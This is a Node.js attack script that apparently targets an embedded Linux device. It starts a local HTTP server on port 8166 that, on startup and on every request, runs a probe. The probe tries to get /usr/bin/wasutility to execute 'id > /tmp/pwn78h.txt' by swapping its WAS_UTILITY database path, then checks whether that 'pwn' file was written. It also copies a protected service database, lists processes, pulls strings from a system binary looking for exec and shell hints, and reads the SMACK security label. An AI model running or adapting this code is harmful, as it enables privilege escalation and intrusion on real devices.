'use strict';
var http = require('http');
var fs = require('fs');
var cp = require('child_process');

var PORT = 8166;
var PROBE_FILE = '/home/owner/share/tmp/sdk_tools/tbprobe78h.txt';
var PWN = '/tmp/pwn78h.txt';

var L = [
  'var fs = require("fs");',
  'var cp = require("child_process");',
  'var r = {};',

  // 1. Check /opt/dbspace/ permissions
  'try {',
  '  var s = fs.statSync("/opt/dbspace");',
  '  r.dbspace_stat = { mode: s.mode.toString(8), uid: s.uid, gid: s.gid };',
  '  r.dbspace_files = fs.readdirSync("/opt/dbspace").slice(0,20);',
  '} catch(e) { r.dbspace_err = e.message; }',

  // 2. Try to create a SQLite DB at /tmp/wastest.db using sqlite3 CLI
  'try {',
  '  var o = cp.spawnSync("/bin/sh", ["-c",',
  '    "sqlite3 /tmp/wastest78.db \\"CREATE TABLE IF NOT EXISTS apps (id INTEGER PRIMARY KEY); INSERT INTO apps VALUES(1);\\" 2>&1; echo sqlite_exit:$?"',
  '  ], {timeout:5000});',
  '  r.sqlite_create = (o.stdout||Buffer.from("")).toString().trim();',
  '  r.sqlite_created = fs.existsSync("/tmp/wastest78.db");',
  '} catch(e) { r.sqlite_err = e.message.slice(0,100); }',

  // 3. Test wasutility with WAS_UTILITY=/tmp/wastest78.db
  'try {',
  '  var env1 = {};',
  '  Object.keys(process.env).forEach(function(k){ env1[k] = process.env[k]; });',
  '  env1.WAS_UTILITY = "/tmp/wastest78.db";',
  '  var o2 = cp.spawnSync("/usr/bin/wasutility", ["-e", "id > ' + PWN + '"], { timeout:5000, env:env1 });',
  '  r.was_wasutil_db = {',
  '    status: o2.status,',
  '    out: ((o2.stdout||Buffer.from("")).toString()+(o2.stderr||Buffer.from("")).toString()).trim().slice(0,200)',
  '  };',
  '} catch(e) { r.was_wasutil_db_err = e.message.slice(0,100); }',

  // 4. Check if pwn file written
  'try { r.pwn_check = fs.readFileSync("' + PWN + '","utf8").trim(); } catch(e) { r.pwn_check_err = e.code; }',

  // 5. Try WAS_UTILITY=/opt/dbspace/.webappservice.db (original path)
  'try {',
  '  var env2 = {};',
  '  Object.keys(process.env).forEach(function(k){ env2[k] = process.env[k]; });',
  '  env2.WAS_UTILITY = "/opt/dbspace/.webappservice.db";',
  '  var o3 = cp.spawnSync("/usr/bin/wasutility", ["-e", "id > ' + PWN + '.2"], { timeout:5000, env:env2 });',
  '  r.was_orig_db = {',
  '    status: o3.status,',
  '    out: ((o3.stdout||Buffer.from("")).toString()+(o3.stderr||Buffer.from("")).toString()).trim().slice(0,200)',
  '  };',
  '  try { r.pwn2_check = fs.readFileSync("' + PWN + '.2","utf8").trim(); } catch(e) { r.pwn2_err = e.code; }',
  '} catch(e) { r.was_orig_db_err = e.message.slice(0,100); }',

  // 6. Check if webappservice is running in process list
  'try {',
  '  var pidlist = fs.readdirSync("/proc").filter(function(p){ return /^[0-9]+$/.test(p); });',
  '  r.webappsvc_pids = [];',
  '  for (var i = 0; i < pidlist.length; i++) {',
  '    try {',
  '      var st = fs.readFileSync("/proc/" + pidlist[i] + "/status", "utf8");',
  '      if (st.indexOf("webappservice") > -1 || st.indexOf("webappsvc") > -1 || st.indexOf("wasm") > -1) {',
  '        var nm = st.match(/^Name:\\t(.+)/m);',
  '        r.webappsvc_pids.push({ pid: pidlist[i], name: nm ? nm[1] : "?" });',
  '      }',
  '    } catch(e) {}',
  '  }',
  '} catch(e) { r.webappsvc_err = e.message; }',

  // 7. RunningAppsService binary strings extraction
  'try {',
  '  var rb = fs.readFileSync("/usr/bin/RunningAppsService");',
  '  r.ras_size = rb.length;',
  '  var rstrs = [];',
  '  var rrun = 0, rstart = 0;',
  '  for (var i = 0; i < rb.length; i++) {',
  '    var b = rb[i];',
  '    if (b >= 32 && b < 127) {',
  '      if (rrun === 0) rstart = i;',
  '      rrun++;',
  '    } else {',
  '      if (rrun >= 5) rstrs.push({ off: rstart, s: rb.slice(rstart, rstart+rrun).toString("ascii") });',
  '      rrun = 0;',
  '    }',
  '  }',
  '  r.ras_paths = rstrs.filter(function(s){ return s.s.charAt(0) === "/"; }).slice(0,30);',
  '  r.ras_misc = rstrs.filter(function(s){ return s.s.indexOf("exec") > -1 || s.s.indexOf("shell") > -1 || s.s.indexOf("cmd") > -1 || s.s.indexOf("-e") > -1 || s.s.indexOf("Error") > -1 || s.s.indexOf("Usage") > -1; }).slice(0,30);',
  '} catch(e) { r.ras_err = e.message; }',

  // 8. Check /etc/prelink.conf content
  'try { r.prelink_conf = fs.readFileSync("/etc/prelink.conf","utf8").slice(0,500); } catch(e) { r.prelink_conf_err = e.message; }',

  // 9. Try copy /opt/dbspace/.webappservice.db to read it
  'try {',
  '  cp.execSync("cp /opt/dbspace/.webappservice.db /tmp/wasdb_copy.db 2>/dev/null; echo $?", {timeout:3000});',
  '  r.wasdb_copy = fs.existsSync("/tmp/wasdb_copy.db") ? "exists" : "missing";',
  '  if (r.wasdb_copy === "exists") {',
  '    r.wasdb_copy_size = fs.statSync("/tmp/wasdb_copy.db").size;',
  '    r.wasdb_copy_magic = fs.readFileSync("/tmp/wasdb_copy.db").slice(0,16).toString("hex");',
  '  }',
  '} catch(e) { r.wasdb_copy_err = e.message.slice(0,100); }',

  // 10. Check smack label on /usr/bin/wasutility
  'try {',
  '  var o5 = cp.spawnSync("/bin/cat", ["/proc/self/attr/current"], {timeout:2000});',
  '  r.our_smack = (o5.stdout||Buffer.from("")).toString().trim();',
  '} catch(e) { r.smack_err = e.message; }',

  'var out = JSON.stringify(r, null, 2);',
  'try { fs.writeFileSync("' + PROBE_FILE + '", out); } catch(e2) {}',
  'process.stdout.write(out);'
];

var INNER = L.join('\n');

function runProbe(cb) {
  cp.execFile(process.execPath, ['-e', INNER], { timeout: 90000 }, function(err, stdout, stderr) {
    if (err) {
      cb(JSON.stringify({ exec_error: err.message.slice(0,200), stderr: (stderr||'').slice(0,500) }));
    } else {
      cb(stdout || '{}');
    }
  });
}

var server = http.createServer(function(req, res) {
  runProbe(function(out) {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(out);
  });
});

server.on('error', function(e) {
  try { fs.writeFileSync(PROBE_FILE, JSON.stringify({ server_err: e.message })); } catch(e2) {}
});

server.listen(PORT, '127.0.0.1', function() {
  runProbe(function(out) {
    try { fs.writeFileSync(PROBE_FILE, out); } catch(e) {}
  });
});

setInterval(function() {}, 60000);
